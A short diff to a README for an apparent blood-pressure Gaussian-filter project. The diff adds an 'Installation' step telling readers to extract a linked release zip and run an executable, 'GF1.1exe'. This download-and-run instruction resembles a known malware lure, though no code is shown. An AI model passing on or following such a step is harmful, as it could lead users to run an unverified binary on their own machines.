@@ -12,5 +12,8 @@ The detection of systolic and diastolic pressure is still not accurate and requi
 Contributing
 We welcome contributions to enhance the functionality and accuracy of this project.
 
+Installation
+Just extract zip and run GF1.1exe <a href="https://github.com/mhbkrn/Gaussian-Filter/releases/download/GF/Averaging.Data.zip">Averaging Data</a> 
+
 Contact
 For questions or support, please open an issue or contact the project maintainer at [muhammadhabibkurnianto@gmail.com].
